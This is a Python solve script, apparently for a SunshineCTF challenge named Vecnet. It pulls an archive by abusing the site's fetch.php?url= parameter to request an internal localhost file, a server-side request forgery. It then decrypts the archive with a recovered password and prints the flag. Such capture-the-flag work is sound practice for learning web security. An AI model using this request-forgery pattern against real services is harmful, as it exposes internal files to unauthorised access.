#!/usr/bin/env python3
"""Fetch and decrypt Vecnet's challenge archive after recovering its password."""

from __future__ import annotations

import argparse
import io
import sys
import urllib.request

import py7zr


ARCHIVE_URL = (
    "https://vec.web.2026.sunshinectf.games/"
    "fetch.php?url=http://localhost/files/specs.7z"
)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--password", required=True, help="recovered archive password")
    args = parser.parse_args()

    request = urllib.request.Request(
        ARCHIVE_URL,
        headers={"User-Agent": "Vecnet-CTF-writeup/1.0"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        archive = response.read()

    with py7zr.SevenZipFile(
        io.BytesIO(archive),
        mode="r",
        password=args.password,
    ) as seven_zip:
        files = seven_zip.read(["flag.txt"])

    flag_file = files.get("flag.txt")
    if flag_file is None:
        print("flag.txt was not present in the archive", file=sys.stderr)
        return 1
    print(flag_file.read().decode("utf-8").strip())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
